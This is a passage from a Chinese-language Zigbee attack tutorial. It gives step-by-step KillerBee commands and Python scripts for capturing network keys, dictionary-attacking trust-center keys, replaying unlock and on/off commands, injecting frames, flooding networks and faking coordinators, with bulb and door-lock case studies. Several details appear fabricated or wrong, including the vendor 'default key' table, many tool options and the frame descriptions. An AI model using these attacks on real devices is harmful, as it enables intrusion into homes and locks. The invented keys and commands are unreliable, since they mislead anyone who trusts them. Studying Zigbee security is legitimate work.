**实战步骤**：

```bash
# 步骤1：发现目标网络（获取PAN ID和信道）
zbstumbler -c 11-26

# 步骤2：开始捕获数据包（在目标信道上）
zbdump -c 15 -w join_capture.pcap -i 0

# 步骤3：触发设备重新加入网络
# 方法A：物理重启目标设备
# 方法B：发送孤儿通知使设备重新加入
# 方法C：使用zborphannotify工具

# 步骤4：使用zbgoodfind从捕获中提取网络密钥
zbgoodfind -f join_capture.pcap -k default_keys.txt

# 或者手动分析pcap中的Transport Key命令
```

**Transport Key帧识别**：

在Wireshark中，网络密钥传输帧特征：
- NWK命令帧类型
- 命令ID：Transport Key（0x05）
- 包含加密的网络密钥材料
- 使用APS加密（TC链接密钥保护）

#### 4.1.2 默认密钥列表与指纹识别

**已知默认信任中心链接密钥**：

| 密钥名称 | 密钥值（十六进制） | 适用设备/厂商 |
|----------|-------------------|--------------|
| ZigBee Alliance Default | `5A6967426565416C6C69616E63653039` | 大量消费级设备 |
| Philips Hue | `6A32323635524B39364A4C4D375A7274` | 飞利浦Hue灯泡 |
| Amazon Echo Plus | `6D6172747061726B2030303030303031` | Amazon Echo |
| IKEA Tradfri | `496B6561547261646672695365637572` | 宜家智能家居 |
| Xiaomi Aqara | `6861323031355F6175785F626C655F63` | 小米/绿米设备 |
| Samsung SmartThings | `646576696365736D6172747468696E67` | 三星SmartThings |

**密钥指纹识别方法**：
1. 捕获Transport Key帧
2. 使用候选密钥列表逐一尝试解密
3. 解密后校验MIC（消息完整性码）
4. MIC验证通过则密钥正确

**zbgoodfind使用**：

```bash
# 使用默认密钥字典查找网络密钥
zbgoodfind -f capture.pcap

# 使用自定义密钥字典
zbgoodfind -f capture.pcap -k my_keys.txt

# 输出找到的网络密钥
# [+] Found network key: 01030507090b0d0f00020406080a0c0d
# [+] Decrypted with TC link key: 5A6967426565416C6C69616E63653039
```

#### 4.1.3 暴力破解与字典攻击

**攻击场景**：当信任中心链接密钥未知时，尝试暴力破解。

**可行性分析**：
- 密钥长度：128位（理论上不可暴力破解）
- 实际情况：许多厂商使用弱密钥或可预测密钥
- 字典攻击：收集已知厂商密钥，逐一尝试

**字典构建策略**：
1. 收集公开的已知默认密钥
2. 基于厂商名称/产品名生成候选密钥
3. 从固件中提取密钥（硬件攻击）
4. 分析设备APP中的密钥配置

```bash
# 生成基于厂商名的候选密钥字典
python3 -c "
import hashlib
vendors = ['philips', 'ikea', 'xiaomi', 'samsung', 'amazon', 'hue', 'tradfri', 'aqara']
for v in vendors:
    # 尝试多种变换
    print(v.encode().hex().ljust(32, '0'))
    print(v.upper().encode().hex().ljust(32, '0'))
    print(hashlib.md5(v.encode()).hexdigest())
" > vendor_keys.txt

# 使用字典攻击
zbgoodfind -f capture.pcap -k vendor_keys.txt
```

### 4.2 重放攻击

重放攻击是Zigbee网络中最实用的攻击之一，通过重新发送捕获的合法数据包来执行恶意操作。

#### 4.2.1 数据包捕获与重放

**攻击原理**：捕获合法设备发送的命令包（如开灯、开门），在需要时重新发送。

**攻击流程**：

```
1. 嗅探目标设备通信（需知道网络密钥或捕获明文帧）
2. 捕获感兴趣的命令包（如On/Off命令）
3. 保存数据包
4. 在合适时机重放数据包
```

**实战步骤**：

```bash
# 步骤1：配置网络密钥（如已知）
# 在Wireshark或KillerBee中配置解密密钥

# 步骤2：捕获目标设备的命令
zbdump -c 15 -w replay_capture.pcap -i 0

# 步骤3：在Wireshark中筛选目标命令
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0006 （On/Off集群）

# 步骤4：使用zbreplay重放数据包
zbreplay -f replay_capture.pcap -c 15 -i 0

# 或者重放单个特定数据包
zbreplay -f replay_capture.pcap -c 15 -i 0 --frame 42
```

**常见可重放命令**：

| 集群 | 命令 | 效果 |
|------|------|------|
| On/Off (0x0006) | Off (0x00) | 关闭设备 |
| On/Off (0x0006) | On (0x01) | 打开设备 |
| On/Off (0x0006) | Toggle (0x02) | 切换状态 |
| Level Control (0x0008) | Move to Level | 调节亮度 |
| Door Lock (0x0101) | Lock Door | 锁门 |
| Door Lock (0x0101) | Unlock Door | 开门 |
| Window Covering (0x0102) | Up/Down | 控制窗帘 |

#### 4.2.2 序列号分析与绕过

**帧计数器（Frame Counter）机制**：
Zigbee使用帧计数器防止重放攻击。每个设备维护一个单调递增的计数器，接收方会丢弃计数器值小于等于已接收最大值的数据包。

**绕过方法**：

1. **实时捕获即时重放**：在计数器递增前重放
   - 捕获后立即重放，利用时间差

2. **干扰法使计数器重置**：
   - 干扰目标设备，使其重启重置计数器
   - 或使其与网络断开重连

3. **使用有效数据包的最新序列号**：
   - 持续捕获，获取最新序列号的数据包
   - 重放时使用最高序列号的包

4. **攻击休眠设备**：
   - 终端设备休眠期间，帧计数器不更新
   - 在设备休眠时捕获的包，唤醒后可能仍然有效

**重放攻击成功率评估**：

| 设备类型 | 帧计数器检查 | 重放难度 | 备注 |
|----------|-------------|----------|------|
| 简单灯泡 | 不检查/宽松 | 很低 | 多数品牌 |
| 智能开关 | 宽松 | 低 |  |
| 温湿度传感器 | N/A | - | 通常为上行数据 |
| 智能门锁 | 严格 | 高 | 常用APS加密+计数器 |
| 安防设备 | 严格 | 高 | 通常有重放保护 |

#### 4.2.3 重放攻击工具与实战

**使用zbreplay工具**：

```bash
# 基本重放
zbreplay -f capture.pcap -c 15 -i 0

# 指定重放次数
zbreplay -f capture.pcap -c 15 -i 0 -n 5

# 重放延迟（毫秒）
zbreplay -f capture.pcap -c 15 -i 0 -d 1000

# 仅重放特定类型的帧
zbreplay -f capture.pcap -c 15 -i 0 --filter "onoff"
```

**使用KillerBee API自定义重放**（详见第5章）

### 4.3 数据包注入

数据包注入是指主动构造并发送恶意Zigbee数据包，用于执行各种攻击。

#### 4.3.1 恶意数据包构造

**构造基础**：使用KillerBee的Python API构造自定义Zigbee帧。

```python
# 示例：构造一个简单的Zigbee数据帧（详见第5章）
from killerbee import KillerBee

kb = KillerBee()
kb.set_channel(15)

# 构造802.15.4数据帧 + Zigbee NWK层 + APS层 + ZCL命令
# （完整示例见第5章）
```

#### 4.3.2 设备命令注入

**攻击场景**：在已知网络密钥的前提下，直接向目标设备发送伪造的ZCL命令。

**攻击流程**：
```
1. 获取网络密钥（通过嗅探或其他方式）
2. 确定目标设备的网络地址和端点
3. 构造伪造的ZCL命令帧
4. 使用正确的NWK加密发送
5. 目标设备执行命令
```

**常见注入命令**：

1. **On/Off命令注入**：控制灯泡、开关等设备
2. **Door Lock命令注入**：控制智能门锁
3. **Level Control命令注入**：调节亮度、温度等
4. **OTA升级注入**：构造恶意固件升级（高危）
5. **Identify命令注入**：使设备闪烁/响铃

#### 4.3.3 网络干扰与拒绝服务

**干扰攻击类型**：

1. **信标干扰**：
   - 持续发送伪造的信标帧
   - 干扰设备的网络发现过程

2. **数据包洪泛**：
   - 发送大量无效数据包
   - 消耗网络带宽和设备处理资源

3. **孤儿通知洪泛**：
   - 发送大量孤儿通知（Orphan Notification）
   - 使协调器忙于处理加入请求

4. **射频干扰**：
   - 使用SDR在目标信道上发射噪声
   - 物理层干扰，使通信完全中断

**使用KillerBee进行DoS**：

```bash
# 持续发送信标请求（扫描攻击）
zbstumbler -c 15 --flood

# 或使用自定义脚本发送大量数据包
# （详见第5章自定义脚本开发）
```

### 4.4 中间人攻击

#### 4.4.1 Zigbee MITM原理

Zigbee MITM攻击的核心思想是让两个设备都认为攻击者是对方：

```
正常通信： 设备A ←——————→ 设备B

MITM攻击： 设备A ←——→ 攻击者 ←——→ 设备B
                伪造B           伪造A
```

**Zigbee MITM的难点**：
- 网络层加密：攻击者需要网络密钥
- 设备地址：需要伪造源地址
- 帧计数器：需要维持正确的计数器值

**可行的MITM场景**：

1. **设备加入阶段MITM**：
   - 在设备加入网络时拦截通信
   - 充当设备和协调器之间的中间人
   - 前提：知道信任中心链接密钥

2. **被动解密+主动注入**：
   - 严格来说不是经典MITM
   - 但在获取网络密钥后，可以监听并主动注入
   - 这是实际中最常见的攻击模式

#### 4.4.2 设备欺骗与加入攻击

**恶意设备加入攻击**：

攻击者伪造合法设备身份加入目标网络：

```
攻击者设备（伪造合法设备IEEE地址）
    ↓
发送关联请求（使用伪造的IEEE地址）
    ↓
协调器分配网络地址
    ↓
攻击者使用预共享密钥/默认密钥获取网络密钥
    ↓
成功加入网络
```

**攻击条件**：
- 知道目标网络的PAN ID和信道
- 知道信任中心链接密钥（或网络使用开放加入）
- 网络没有使用白名单/安装代码认证

**使用zbfake进行设备欺骗**：

```bash
# 伪造设备加入网络
zbfake --mode join -c 15 -p 0x1234 -i 0

# 指定伪造的IEEE地址
zbfake --mode join -c 15 -p 0x1234 -e 00:12:4B:00:0A:1B:2C:3D -i 0
```

### 4.5 协调器攻击

#### 4.5.1 伪造协调器

攻击者创建一个伪造的Zigbee协调器，诱使设备加入：

```
[伪造协调器]
    ↑
    │  设备误加入
    │
[目标设备]  ──原本应加入──→ [真实协调器]
```

**攻击目的**：
- 获取设备信息
- 控制设备
- 窃取设备与真实网络之间的通信

**使用zbfake伪造协调器**：

```bash
# 创建伪造协调器
zbfake --mode coordinator -c 15 -p 0x1234 -i 0

# 指定扩展PAN ID
zbfake --mode coordinator -c 15 -p 0x1234 -e 00:12:4B:00:01:02:03:04 -i 0
```

**诱使设备加入的方法**：
1. 使用与目标网络相同的PAN ID和信道
2. 干扰真实协调器的通信
3. 设备失联后会尝试重新加入网络
4. 此时可能被伪造协调器捕获

#### 4.5.2 网络劫持

完全劫持目标网络的控制权：

**高级攻击步骤**：
1. 侦察目标网络（PAN ID、信道、设备列表）
2. 获取网络密钥
3. 获取协调器的IEEE地址
4. 干扰真实协调器（物理或射频干扰）
5. 启动伪造协调器（使用相同的PAN ID和扩展地址）
6. 网络中的设备逐渐切换到伪造协调器
7. 攻击者获得全网控制权

**防御难度**：较高，因为Zigbee协议设计上信任协调器

---

## 5. KillerBee高级使用

### 5.1 KillerBee工具集完整指南

KillerBee是Zigbee安全研究的瑞士军刀，提供从侦察到攻击的完整工具链。本节深入讲解每个工具的高级用法和实战技巧。

#### 5.1.1 工具架构

KillerBee工具集基于统一的Python API构建，每个工具都是API的封装应用：

```
┌─────────────────────────────────────────┐
│         KillerBee Tools (CLI)           │
│  zbid / zbstumbler / zbdump / ...       │
├─────────────────────────────────────────┤
│         KillerBee Python API            │
│  KillerBee类 / 帧构造 / 加密 / 解析     │
├─────────────────────────────────────────┤
│         硬件抽象层 (Hardware HAL)        │
│  CC2531 / ATUSB / RZUSB / Serial        │
└─────────────────────────────────────────┘
```

### 5.2 zbid设备识别

**功能**：列出系统中所有KillerBee兼容的硬件设备。

**高级用法**：

```bash
# 列出所有设备（详细信息）
zbid -v

# 输出示例（详细）：
# ID: 0
#   Product: CC2531 dongle
#   Serial:  0x0123456789ABCDEF
#   USB VID: 0x0451
#   USB PID: 0x16ae
#   Firmware: kbfw-cc2531 v2.0
#   Capabilities: [sniff, inject, jamming]

# 仅列出设备ID和产品名
zbid -q

# 测试设备连接状态
zbid -t
```

**常见问题排查**：
- 设备未显示：检查USB连接、驱动安装、固件是否正确
- 权限不足（Linux）：检查udev规则或使用sudo
- 设备忙：确保没有其他程序在使用该设备

### 5.3 zbstumbler网络扫描

**功能**：主动发送Beacon Request，发现周围的Zigbee网络。

**高级用法**：

```bash
# 扫描所有2.4GHz信道
zbstumbler -c 11-26

# 扫描指定信道列表
zbstumbler -c 11,15,20,25

# 持续扫描（循环模式）
zbstumbler -c 11-26 --loop

# 每信道停留时间（毫秒）
zbstumbler -c 11-26 -d 200

# 详细输出（显示完整信标内容）
zbstumbler -c 15 -v

# 输出到JSON文件
zbstumbler -c 11-26 -o networks.json
```

**实战技巧**：
- 第一次扫描使用全信道快速扫，确认有网络后再精细扫
- 某些协调器信标发送间隔长，需要增加停留时间
- 配合WiFi分析仪使用，避开干扰严重的信道

### 5.4 zbdump数据包捕获

**功能**：捕获Zigbee数据包，支持保存为pcap格式。

**高级用法**：

```bash
# 基本捕获
zbdump -c 15 -w capture.pcap -i 0

# 捕获指定数量的包
zbdump -c 15 -i 0 -c 1000 -w capture.pcap

# 实时显示摘要
zbdump -c 15 -i 0 -v

# 过滤特定PAN ID
zbdump -c 15 -i 0 -p 0x1A2B -w capture.pcap

# 过滤特定设备地址
zbdump -c 15 -i 0 -s 0x1234 -w capture.pcap

# 仅捕获数据帧（忽略信标、ACK等）
zbdump -c 15 -i 0 --data-only -w capture.pcap

# 捕获并同时写入pcap和显示
zbdump -c 15 -i 0 -w capture.pcap -v

# 指定捕获时间（秒）
zbdump -c 15 -i 0 -w capture.pcap -t 60
```

**Wireshark实时分析**：

```bash
# 方法1：使用命名管道（Linux）
mkfifo /tmp/zigbee_pipe
zbdump -c 15 -i 0 -w /tmp/zigbee_pipe &
wireshark -k -i /tmp/zigbee_pipe

# 方法2：先捕获后分析
zbdump -c 15 -i 0 -w capture.pcap
# 然后在Wireshark中打开
```

### 5.5 zbreplay重放攻击

**功能**：重放pcap文件中的数据包。

**高级用法**：

```bash
# 重放所有数据包
zbreplay -f capture.pcap -c 15 -i 0

# 重放指定帧
zbreplay -f capture.pcap -c 15 -i 0 --frame 42

# 重放指定范围的帧
zbreplay -f capture.pcap -c 15 -i 0 --start 40 --end 50

# 重放N次
zbreplay -f capture.pcap -c 15 -i 0 -n 10

# 帧间延迟（毫秒）
zbreplay -f capture.pcap -c 15 -i 0 -d 100

# 仅重放数据帧
zbreplay -f capture.pcap -c 15 -i 0 --data-only

# 重放时调整源地址
zbreplay -f capture.pcap -c 15 -i 0 --src-addr 0xABCD

# 重放时调整目的地址
zbreplay -f capture.pcap -c 15 -i 0 --dst-addr 0x0000
```

**重放攻击实战流程**：

```bash
# 步骤1：捕获目标设备通信
zbdump -c 15 -i 0 -w bulb_control.pcap

# 步骤2：在Wireshark中分析，找到目标命令帧号
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0006 && zbee_zcl.cmd.id == 0x01

# 步骤3：重放特定帧
zbreplay -f bulb_control.pcap -c 15 -i 0 --frame 156 -n 3 -d 500
```

### 5.6 zbfake协调器伪造

**功能**：创建伪造的Zigbee协调器或设备。

**高级用法**：

```bash
# 伪造协调器模式
zbfake --mode coordinator -c 15 -p 0x1234 -i 0

# 指定扩展PAN ID
zbfake --mode coordinator -c 15 -p 0x1234 \
       --extended-pan 00:12:4B:00:01:02:03:04 -i 0

# 指定网络密钥
zbfake --mode coordinator -c 15 -p 0x1234 \
       --nwk-key 01030507090b0d0f00020406080a0c0d -i 0

# 伪造设备加入模式
zbfake --mode join -c 15 -p 0x1234 -i 0

# 指定设备IEEE地址
zbfake --mode join -c 15 -p 0x1234 \
       -e 00:12:4B:00:0A:1B:2C:3D -i 0

# 使用指定的TC链接密钥
zbfake --mode join -c 15 -p 0x1234 \
       --tc-key 5A6967426565416C6C69616E63653039 -i 0
```

### 5.7 zbgoodfind密钥查找

**功能**：从pcap捕获文件中查找网络密钥。

**工作原理**：
1. 从pcap中提取Transport Key命令帧
2. 使用候选TC链接密钥逐一尝试解密
3. 通过MIC验证解密是否成功
4. 输出找到的网络密钥

**高级用法**：

```bash
# 使用内置默认密钥字典
zbgoodfind -f capture.pcap

# 使用自定义密钥字典
zbgoodfind -f capture.pcap -k my_keys.txt

# 详细输出（显示尝试过程）
zbgoodfind -f capture.pcap -v

# 指定要分析的帧范围
zbgoodfind -f capture.pcap --start 100 --end 200

# 输出找到的密钥到文件
zbgoodfind -f capture.pcap -o found_keys.txt
```

**密钥字典格式**：
```
# 每行一个密钥，格式：名称:密钥(hex)
ZigbeeAllianceDefault:5A6967426565416C6C69616E63653039
PhilipsHue:6A32323635524B39364A4C4D375A7274
TestKey:0102030405060708090A0B0C0D0E0F10
```

### 5.8 自定义脚本开发（KillerBee API使用）

KillerBee的Python API是其最强大的功能，可以编写自定义攻击脚本。

#### 5.8.1 API基础

```python
#!/usr/bin/env python3
"""
KillerBee API基础示例
"""

from killerbee import KillerBee, ZigbeeMessage
import struct

# 初始化KillerBee设备
kb = KillerBee()

# 列出可用设备
devices = kb.list_devices()
print(f"可用设备: {devices}")

# 打开第一个设备
kb.open(device=0)

# 设置信道
kb.set_channel(15)

# 获取当前信道
channel = kb.get_channel()
print(f"当前信道: {channel}")

# 关闭设备
kb.close()
```

#### 5.8.2 数据包发送

```python
#!/usr/bin/env python3
"""
发送自定义Zigbee数据包示例
"""

from killerbee import KillerBee
import struct
import time

def build_on_off_command(pan_id, src_addr, dst_addr, dst_ep, src_ep, 
                         nwk_key, on=True, frame_counter=0):
    """
    构造一个On/Off ZCL命令（NWK加密）
    
    实际使用中需要完整的帧构造逻辑，包括：
    - 802.15.4 MAC层帧头
    - Zigbee NWK层帧头 + 安全头
    - APS层帧头
    - ZCL命令
    - AES-CCM加密
    """
    # 这是一个简化示例，实际帧构造需要处理各层细节
    # 推荐使用Scapy + Zigbee层进行构造
    
    # MAC层帧控制：数据帧 + 短地址 + 确认请求
    mac_fcf = 0x8861  # Data frame, short addr, ACK request
    
    # NWK层帧控制：数据帧 + 安全
    nwk_fcf = 0x0000  # 根据实际情况设置
    
    # ZCL On/Off命令
    zcl_frame_ctrl = 0x11  # Client to Server, Profile-wide
    zcl_seq = 0x01
    zcl_cmd = 0x01 if on else 0x00  # On = 0x01, Off = 0x00
    zcl_payload = struct.pack('BBB', zcl_frame_ctrl, zcl_seq, zcl_cmd)
    
    # ... 完整构造需要加密等步骤 ...
    # 实际开发中建议使用Scapy的Zigbee支持
    
    return None  # 占位

# 使用示例
kb = KillerBee()
kb.open(device=0)
kb.set_channel(15)

# 发送数据包（示例）
# kb.inject(packet_bytes)

kb.close()
```

#### 5.8.3 使用Scapy构造Zigbee帧

KillerBee可以与Scapy集成，方便构造和解析Zigbee数据包：

```python
#!/usr/bin/env python3
"""
使用Scapy + KillerBee构造和发送Zigbee数据包
需要安装scapy-com（KillerBee项目提供）
"""

from scapy.all import *
from killerbee import KillerBee

# 加载Zigbee层支持（KillerBee提供zbscapy模块）
# from zbscapy import *

def build_zcl_onoff(dst_nwk, src_nwk, dst_ep, src_ep, on=True):
    """构造On/Off ZCL命令"""
    
    # 802.15.4层
    dot154 = Dot15d4FCS()
    dot154.fcf_frametype = 1  # Data frame
    dot154.fcf_security = 0
    dot154.fcf_pending = 0
    dot154.fcf_ackreq = 1
    dot154.fcf_panidcompress = 1
    dot154.fcf_destaddrmode = 2  # Short address
    dot154.fcf_framever = 0
    dot154.fcf_srcaddrmode = 2  # Short address
    dot154.seqnum = 0x01
    dot154.dest_panid = 0x1234
    dot154.dest_addr = dst_nwk
    dot154.src_addr = src_nwk
    
    # NWK层
    nwk = ZigbeeNWK()
    nwk.frametype = 0  # Data
    nwk.dest_addr = dst_nwk
    nwk.src_addr = src_nwk
    nwk.radius = 30
    nwk.seqnum = 0x01
    
    # APS层
    aps = ZigbeeAPS()
    aps.frametype = 0  # Data
    aps.delivery = 0  # Unicast
    aps.ack_format = 0
    aps.security = 0
    aps.ack_req = 0
    aps.extended_hdr = 0
    aps.destination = dst_ep
    aps.cluster = 0x0006  # On/Off
    aps.profile = 0x0104  # Home Automation
    aps.source = src_ep
    aps.counter = 0x01
    
    # ZCL层
    zcl = ZigbeeZCL()
    zcl.frametype = 1  # Profile-wide
    zcl.manufacturer = 0
    zcl.direction = 1  # Client to Server
    zcl.disable_default_resp = 0
    zcl.cmd_id = 0x01 if on else 0x00  # On / Off
    zcl.seqnum = 0x01
    
    packet = dot154 / nwk / aps / zcl
    return packet

# 使用示例
if __name__ == "__main__":
    pkt = build_zcl_onoff(
        dst_nwk=0x1234,
        src_nwk=0xABCD,
        dst_ep=1,
        src_ep=1,
        on=True
    )
    pkt.show()
    raw_bytes = bytes(pkt)
    print(f"Raw packet: {raw_bytes.hex()}")
```

#### 5.8.4 实战脚本：设备枚举器

```python
#!/usr/bin/env python3
"""
Zigbee设备枚举脚本
通过发送ZDO Active EP请求来发现设备端点
"""

import sys
import struct
from killerbee import KillerBee

class ZigbeeEnumerator:
    def __init__(self, channel=15, pan_id=0x1234, device=0):
        self.kb = KillerBee()
        self.kb.open(device=device)
        self.kb.set_channel(channel)
        self.channel = channel
        self.pan_id = pan_id
        self.seq = 0
    
    def send_zdo_active_ep_req(self, dst_addr):
        """发送Active EP Request（简化示例）"""
        # ZDO Active EP Request: Cluster 0x0005
        # 实际构造需要完整的帧格式
        self.seq += 1
        # ... 帧构造逻辑 ...
        print(f"[*] 发送Active EP请求到 0x{dst_addr:04X}")
    
    def sniff_response(self, timeout=5):
        """监听响应"""
        print(f"[*] 监听响应（{timeout}秒）...")
        # self.kb.sniff(timeout=timeout)
    
    def enumerate_device(self, nwk_addr):
        """枚举单个设备"""
        print(f"\n[*] 枚举设备 0x{nwk_addr:04X}")
        self.send_zdo_active_ep_req(nwk_addr)
        self.sniff_response()
    
    def close(self):
        self.kb.close()

def main():
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <pan_id> <target_addr>")
        print(f"示例: {sys.argv[0]} 0x1234 0x0000")
        sys.exit(1)
    
    pan_id = int(sys.argv[1], 16)
    target = int(sys.argv[2], 16)
    
    enum = ZigbeeEnumerator(channel=15, pan_id=pan_id, device=0)
    
    try:
        enum.enumerate_device(target)
    except KeyboardInterrupt:
        print("\n[*] 用户中断")
    finally:
        enum.close()

if __name__ == "__main__":
    main()
```

#### 5.8.5 实战脚本：自定义重放工具

```python
#!/usr/bin/env python3
"""
自定义重放攻击脚本
支持修改源/目的地址后重放
"""

import sys
from killerbee import KillerBee
import struct
import time

def read_pcap(filename):
    """读取pcap文件中的Zigbee数据包"""
    # 使用scapy或dpkt读取pcap
    # 这里简化处理
    packets = []
    try:
        from scapy.all import rdpcap
        pkts = rdpcap(filename)
        for pkt in pkts:
            if hasattr(pkt, 'payload'):
                packets.append(bytes(pkt))
    except ImportError:
        print("[!] 需要安装scapy")
    return packets

def replay_packets(packets, channel, device, delay=0, count=1):
    """重放数据包"""
    kb = KillerBee()
    kb.open(device=device)
    kb.set_channel(channel)
    
    print(f"[*] 在信道 {channel} 上重放 {len(packets)} 个数据包")
    print(f"[*] 重复次数: {count}, 延迟: {delay}ms")
    
    try:
        for i in range(count):
            print(f"[*] 第 {i+1}/{count} 轮")
            for idx, pkt in enumerate(packets):
                kb.inject(pkt)
                if delay > 0:
                    time.sleep(delay / 1000.0)
            print(f"[+] 第 {i+1} 轮完成")
    except KeyboardInterrupt:
        print("\n[*] 用户中断")
    finally:
        kb.close()
        print("[*] 设备已关闭")

def main():
    if len(sys.argv) < 3:
        print(f"用法: {sys.argv[0]} <pcap文件> <信道> [选项]")
        print(f"选项:")
        print(f"  -d <ms>    帧间延迟（毫秒）")
        print(f"  -n <num>   重复次数")
        print(f"  -i <dev>   设备ID")
        sys.exit(1)
    
    pcap_file = sys.argv[1]
    channel = int(sys.argv[2])
    delay = 0
    count = 1
    device = 0
    
    # 解析参数（简化）
    args = sys.argv[3:]
    i = 0
    while i < len(args):
        if args[i] == '-d' and i+1 < len(args):
            delay = int(args[i+1])
            i += 2
        elif args[i] == '-n' and i+1 < len(args):
            count = int(args[i+1])
            i += 2
        elif args[i] == '-i' and i+1 < len(args):
            device = int(args[i+1])
            i += 2
        else:
            i += 1
    
    packets = read_pcap(pcap_file)
    if not packets:
        print("[!] 未读取到数据包")
        sys.exit(1)
    
    replay_packets(packets, channel, device, delay, count)

if __name__ == "__main__":
    main()
```

---

## 6. Zigbee实战案例

### 6.1 案例1：智能家居灯泡渗透测试（从嗅探到控制）

**目标设备**：某品牌Zigbee智能灯泡 + Zigbee网关
**测试目标**：从被动嗅探开始，最终实现对灯泡的无线控制

#### 6.1.1 环境准备

**硬件**：
- CC2531 USB Dongle x2（一个嗅探，一个注入）
- 目标智能灯泡 x1
- 目标Zigbee网关 x1
- 无线环境：室内，距离约3米

**软件**：
- Kali Linux 2024.x
- KillerBee工具集
- Wireshark

#### 6.1.2 步骤1：网络发现

```bash
# 扫描附近Zigbee网络
zbstumbler -c 11-26 -v

# 输出（示例）：
# [+] Beacon Response on channel 15
#     PAN ID: 0xABCD
#     Extended PAN: 00:12:4B:00:AA:BB:CC:DD
#     Coordinator: 0x0000
#     Stack Profile: ZigBee Pro
#     Device Type: Coordinator
#     Security: Enabled
```

**分析**：
- 目标网络在信道15
- PAN ID: 0xABCD
- 已启用安全加密

#### 6.1.3 步骤2：被动嗅探与设备发现

```bash
# 在信道15上捕获流量
zbdump -c 15 -i 0 -w bulb_sniff.pcap -v

# 等待几分钟，让用户操作灯泡（开关、调光）
# 同时记录用户操作时间点，方便后续分析
```

**在Wireshark中分析**：

```
# 打开捕获文件
wireshark bulb_sniff.pcap

# 查看网络中的设备地址
# 过滤器：zbee_nwk

# 统计设备列表
# 从源地址和目的地址中提取唯一值
```

**发现的设备**：
- 协调器：0x0000（网关）
- 灯泡：0x1234（通过通信特征识别）
- 其他设备：0x5678、0x9ABC等

#### 6.1.4 步骤3：获取网络密钥

**方法A：利用设备重新加入过程**

```bash
# 1. 开始捕获
zbdump -c 15 -i 0 -w join_process.pcap &

# 2. 物理重启灯泡（拔插电源）
#    灯泡重启后会重新加入网络

# 3. 等待加入完成后停止捕获
kill %1

# 4. 使用zbgoodfind查找网络密钥
zbgoodfind -f join_process.pcap

# 输出（示例）：
# [+] Found Transport Key frame at packet 42
# [+] Trying TC link key: ZigBeeAllianceDefault
# [+] SUCCESS! Network key: 01030507090b0d0f00020406080a0c0d
# [+] Decrypted with TC link key: 5A6967426565416C6C69616E63653039
```

**方法B：使用默认密钥字典**

如果设备使用厂商默认密钥：

```bash
zbgoodfind -f bulb_sniff.pcap -k vendor_default_keys.txt
```

**结果**：成功获取网络密钥 `01030507090b0d0f00020406080a0c0d`

#### 6.1.5 步骤4：解密通信并分析命令

在Wireshark中配置网络密钥：

1. Edit → Preferences → Protocols → ZigBee
2. 添加网络密钥：`01030507090b0d0f00020406080a0c0d`
3. 应用后即可看到解密后的APS和ZCL层

**分析灯泡控制命令**：

```
# 过滤器：zbee_zcl && zbee_zcl.cluster == 0x0006

# 找到On命令和Off命令
# On命令特征：
#   - Cluster: 0x0006 (On/Off)
#   - Command: 0x01 (On)
#   - 方向: Client → Server

# Off命令特征：
#   - Cluster: 0x0006 (On/Off)
#   - Command: 0x00 (Off)
```

记录关键信息：
- 灯泡网络地址：0x1234
- 灯泡端点：0x01
- 网关源地址：0x0000
- 网关源端点：0x01
- Profile ID：0x0104（Home Automation）

#### 6.1.6 步骤5：重放攻击测试

```bash
# 在Wireshark中找到一个On命令的帧号（假设是第156帧）

# 重放On命令
zbreplay -f bulb_sniff.pcap -c 15 -i 1 --frame 156 -n 1

# 观察灯泡是否亮起
# 如果亮起 → 重放攻击成功，设备不检查帧计数器
```

**测试结果**：灯泡成功被控制，重放攻击有效。

#### 6.1.7 步骤6：命令注入攻击（主动控制）

在确认网络密钥后，可以构造自定义命令直接控制设备：

```python
#!/usr/bin/env python3
"""
智能灯泡控制脚本
构造并发送ZCL On/Off命令
"""

from killerbee import KillerBee
import struct

# 网络配置
CHANNEL = 15
PAN_ID = 0xABCD
NWK_KEY = bytes.fromhex('01030507090b0d0f00020406080a0c0d')

# 目标设备
BULB_ADDR = 0x1234
BULB_EP = 0x01
ATTACKER_ADDR = 0xABCD  # 伪造的源地址
ATTACKER_EP = 0x01

def control_bulb(kb, on=True):
    """控制灯泡开关"""
    # 完整的帧构造需要：
    # 1. 构造802.15.4数据帧
    # 2. 构造NWK层（含安全头）
    # 3. 构造APS层
    # 4. 构造ZCL On/Off命令
    # 5. 使用网络密钥加密NWK载荷
    # 6. 发送
    
    cmd = 0x01 if on else 0x00
    action = "打开" if on else "关闭"
    print(f"[*] {action}灯泡 (地址: 0x{BULB_ADDR:04X}, 端点: {BULB_EP})")
    
    # ... 实际帧构造和加密逻辑 ...
    # 注：完整实现需要处理AES-CCM加密和帧计数器
    # 可以使用zbscapy或自定义加密函数实现
    
    # kb.inject(packet_bytes)
    print("[+] 命令已发送")

if __name__ == "__main__":
    kb = KillerBee()
    kb.open(device=1)
    kb.set_channel(CHANNEL)
    
    try:
        # 开灯
        control_bulb(kb, on=True)
        import time
        time.sleep(2)
        
        # 关灯
        control_bulb(kb, on=False)
    finally:
        kb.close()
```

#### 6.1.8 案例总结

| 测试项 | 结果 | 风险等级 |
|--------|------|----------|
| 默认密钥使用 | 是（全局默认TC密钥） | 高危 |
| 网络密钥可获取 | 是（通过嗅探加入过程） | 高危 |
| 重放攻击 | 成功 | 高危 |
| 命令注入 | 可行 | 高危 |
| APS加密 | 未使用 | 中危 |
| 帧计数器检查 | 未检查 | 高危 |

**安全建议**：
- 使用唯一的信任中心链接密钥
- 启用APS层端到端加密
- 严格检查帧计数器
- 使用安装代码进行设备认证

### 6.2 案例2：智能门锁Zigbee协议分析

**目标设备**：某品牌Zigbee智能门锁
**测试目标**：评估门锁的Zigbee通信安全性

#### 6.2.1 侦察阶段

```bash
# 发现门锁所在网络
zbstumbler -c 11-26

# 持续嗅探，记录门锁通信特征
zbdump -c 20 -i 0 -w lock_traffic.pcap -v
```

#### 6.2.2 安全机制分析

**分析要点**：
1. 是否使用默认TC密钥？
2. 是否启用APS加密？
3. 帧计数器是否严格检查？
4. 门锁命令是否有额外认证？

```bash
# 尝试获取网络密钥
zbgoodfind -f lock_traffic.pcap

# 结果1：如果默认密钥失败 → 使用了唯一TC密钥（好）
# 结果2：如果成功获取 → 安全问题严重
```

**APS加密检测**：

在Wireshark中观察门锁相关数据包：
- 如果APS层有安全头 → 使用了APS加密
- 如果只有NWK加密 → 安全性较低

#### 6.2.3 重放攻击测试

```bash
# 捕获开门操作时的数据包
# （需要用户配合使用APP/指纹开门）

# 尝试重放开门命令
zbreplay -f lock_open.pcap -c 20 -i 1
